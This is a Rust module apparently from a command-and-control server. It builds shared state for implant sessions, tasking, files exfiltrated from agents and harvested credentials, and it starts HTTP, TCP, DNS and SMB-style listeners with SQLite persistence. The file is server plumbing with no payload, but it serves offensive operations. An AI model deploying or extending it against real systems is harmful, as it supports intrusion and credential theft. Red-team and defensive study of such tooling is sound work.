use std::path::PathBuf;
use std::sync::Arc;

use crate::creds::SharedCredStore;
use crate::filestore::FileStore;
use crate::queue::SharedQueue;
use crate::session::SharedRegistry;
use crate::uploadstore::UploadStore;

/// Shared server state handed to axum handlers.
#[derive(Clone)]
pub struct ServerState {
    pub registry: SharedRegistry,
    pub queue: SharedQueue,
    pub psk: Arc<Vec<u8>>,
    /// On-disk store for files pulled off agents.
    pub files: FileStore,
    /// Registry of server->implant uploads in flight.
    pub uploads: UploadStore,
    /// Harvested credentials store.
    pub creds: SharedCredStore,
}

/// Bind the C2 HTTP listener and serve until shutdown. Optionally starts TCP
/// and DNS listeners based on ServerConfig.
pub async fn serve(state: ServerState, config: &crate::config::ServerConfig) -> anyhow::Result<()> {
    let app = crate::channels::application(state.clone());
    let listener = tokio::net::TcpListener::bind(&config.bind).await?;
    tracing::info!(bind = %config.bind, "c2 http listener up");
    // Spawn optional TCP transport listener.
    if let Some(tcp_bind) = &config.tcp_bind {
        let tcp_state = state.clone();
        let tcp_bind = tcp_bind.clone();
        tokio::spawn(async move {
            if let Err(error) = crate::tcp::serve_tcp(tcp_state, tcp_bind).await {
                tracing::error!(%error, "c2 raw-tcp listener stopped");
            }
        });
    }
    // Spawn optional DNS listener.
    if let Some(dns_bind) = config.dns_bind.clone() {
        let dns_state = state.clone();
        tracing::info!(dns_bind, "c2 dns listener up");
        tokio::spawn(async move {
            if let Err(e) = crate::dns::serve_dns(
                dns_state.registry.clone(),
                dns_state.queue.clone(),
                dns_state.psk.as_ref().clone(),
                dns_bind,
            )
            .await
            {
                tracing::error!(error = %e, "dns listener failed");
            }
        });
    }
    // Spawn optional SMB listener (HTTP-compatible C2 over SMB-named-pipe
    // fallback; in production this would be a real SMB daemon).
    if let Some(smb_bind) = config.smb_bind.clone() {
        let smb_app = crate::channels::application(state.clone());
        let smb_listener = tokio::net::TcpListener::bind(&smb_bind).await?;
        tracing::info!(smb_bind, "c2 smb listener up");
        tokio::spawn(async move {
            let _ = axum::serve(smb_listener, smb_app).await;
        });
    }
    axum::serve(listener, app).await?;
    Ok(())
}

/// Convenience wrapper: start an HTTP-only listener on `bind` with the given
/// state. Used by tests and minimal deployments that don't need TCP/DNS/SMB
/// channels.
pub async fn serve_with_bind(state: ServerState, bind: &str) -> anyhow::Result<()> {
    let app = crate::channels::application(state);
    let listener = tokio::net::TcpListener::bind(bind).await?;
    tracing::info!(bind, "c2 listener up");
    axum::serve(listener, app).await?;
    Ok(())
}

/// Build ServerState from a ServerConfig, initializing SQLite persistence if
/// NW_DB is set. An explicitly configured database is a durability contract,
/// so initialization errors are returned instead of silently using memory.
pub async fn build_state(config: &crate::config::ServerConfig) -> anyhow::Result<ServerState> {
    let psk = config.psk.clone().into_bytes();
    let downloads = PathBuf::from(&config.downloads_dir);

    let (registry, queue, creds) = if let Some(db) = config.db_path() {
        let pool = crate::persist::open_pool(db).await?;
        tracing::info!(db, "c2 sqlite persistence enabled");
        let registry = crate::session::SessionRegistry::with_sqlite(pool.clone());
        let queue = crate::queue::TaskQueue::with_sqlite(pool.clone());
        let creds = crate::creds::CredentialStore::new(pool);
        (Arc::new(registry), Arc::new(queue), Arc::new(creds))
    } else {
        // In-memory fallback: a credential store with no DB. Harvested creds
        // won't persist, but the dispatcher still needs a valid handle.
        let empty = Arc::new(crate::creds::CredentialStore::new_in_memory());
        (
            Arc::new(crate::session::SessionRegistry::new()),
            Arc::new(crate::queue::TaskQueue::new()),
            empty,
        )
    };

    Ok(ServerState {
        registry,
        queue,
        psk: Arc::new(psk),
        files: FileStore::new(downloads),
        uploads: UploadStore::default(),
        creds,
    })
}

/// Build a server and return the exact SQLite pool shared by sessions, tasks,
/// operators, and audit. The console uses this to avoid separate in-memory
/// databases when `NW_DB` is unset.
pub async fn build_state_with_pool(
    config: &crate::config::ServerConfig,
) -> anyhow::Result<(ServerState, sqlx::SqlitePool)> {
    let db = config.db_path().unwrap_or(":memory:");
    let pool = crate::persist::open_pool(db).await?;
    let state = ServerState {
        registry: Arc::new(crate::session::SessionRegistry::with_sqlite(pool.clone())),
        queue: Arc::new(crate::queue::TaskQueue::with_sqlite(pool.clone())),
        psk: Arc::new(config.psk.clone().into_bytes()),
        files: FileStore::new(PathBuf::from(&config.downloads_dir)),
        uploads: UploadStore::default(),
        creds: Arc::new(crate::creds::CredentialStore::new(pool.clone())),
    };
    Ok((state, pool))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn configured_database_failure_is_not_silently_downgraded_to_memory() {
        let dir = tempfile::tempdir().unwrap();
        let missing_parent = dir.path().join("missing").join("c2.sqlite");
        let config = crate::config::ServerConfig {
            bind: "127.0.0.1:0".into(),
            tcp_bind: None,
            dns_bind: None,
            smb_bind: None,
            callback_host: "http://127.0.0.1:0".into(),
            psk: "test-psk".into(),
            downloads_dir: dir.path().join("downloads").display().to_string(),
            db_path: Some(missing_parent.display().to_string()),
            admin_password: None,
        };

        assert!(build_state(&config).await.is_err());
    }
}
